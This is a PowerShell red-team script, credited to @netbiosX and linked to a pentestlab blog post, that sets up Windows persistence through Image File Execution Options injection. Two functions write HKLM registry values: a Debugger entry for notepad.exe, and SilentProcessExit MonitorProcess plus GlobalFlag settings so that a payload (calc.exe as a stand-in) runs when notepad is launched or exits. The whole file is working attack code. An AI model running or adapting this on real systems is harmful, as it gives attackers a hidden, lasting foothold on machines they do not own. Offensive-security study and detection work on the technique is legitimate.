<#
    ImageFileExecutionOptions v1.0
    License: GPLv3
    Author: @netbiosX
#>
# Image File Execution Options Injection Persistence Technique
# https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/

function Persist-Debugger

{

    $Registry = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'

    Push-Location
    Set-Location $Registry

    if(Test-Path "$Registry\Image File Execution Options\notepad.exe"){

    Write-Verbose 'Key Already Exists' -Verbose

    }else{

    New-Item -Path "$Registry\Image File Execution Options" -Name 'notepad.exe'

	$GetRegKey = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe'

	$GetIFEO = Get-Item -Path "$GetRegKey"

	$Payload = 'calc.exe'
	
	$GetIFEO | Set-ItemProperty -Name Debugger -Value $Payload
}
}

function Persist-GlobalFlags

{

    $Registry = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'

    Push-Location
    Set-Location $Registry

    if(Test-Path "$Registry\SilentProcessExit"){

    Write-Verbose 'Key Already Exists' -Verbose

    }else{

    New-Item -Path "$Registry" -Name 'SilentProcessExit'
    New-Item -Path "$Registry\SilentProcessExit" -Name 'notepad.exe'
    New-Item -Path "$Registry\Image File Execution Options" -Name 'notepad.exe'

    $GetRegKey = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe'
    $GetReg = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe'

	$GetIFEO = Get-Item -Path "$GetRegKey"
    $GetIF = Get-Item -Path "$GetReg"

	$Payload = 'C:\Windows\System32\calc.exe'
	
	$GetIFEO | New-ItemProperty -Name MonitorProcess -Value $Payload
    $GetIFEO | New-ItemProperty -Name ReportingMode -Value 1 -PropertyType "DWORD"
    $GetIF | New-ItemProperty -Name GlobalFlag -Value 512 -PropertyType "DWORD"

    }
}